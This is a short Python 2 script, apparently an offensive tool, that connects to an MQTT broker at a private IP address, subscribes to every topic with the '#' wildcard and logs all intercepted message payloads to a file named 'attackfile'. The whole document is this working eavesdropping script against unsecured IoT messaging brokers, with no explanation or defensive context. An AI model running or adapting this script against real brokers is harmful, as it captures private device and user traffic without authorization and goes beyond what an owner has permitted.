import paho.mqtt.client as mqtt
def on_connect(client, userdata, flags, rc):
   print "[+] Connection successful"
   client.subscribe('#', qos = 1)        # Subscribe to all topics
  # client.subscribe('$SYS/#')            # Broker Status (Mosquitto)
def on_message(client, userdata, msg):
   outfile = open('attackfile','a')
   outfile.write(str(msg.payload))
   outfile.close()
   print msg.payload
client = mqtt.Client(client_id = "MqttClient")
client.on_connect = on_connect
client.on_message = on_message
client.connect('172.30.192.171')
client.loop_forever()
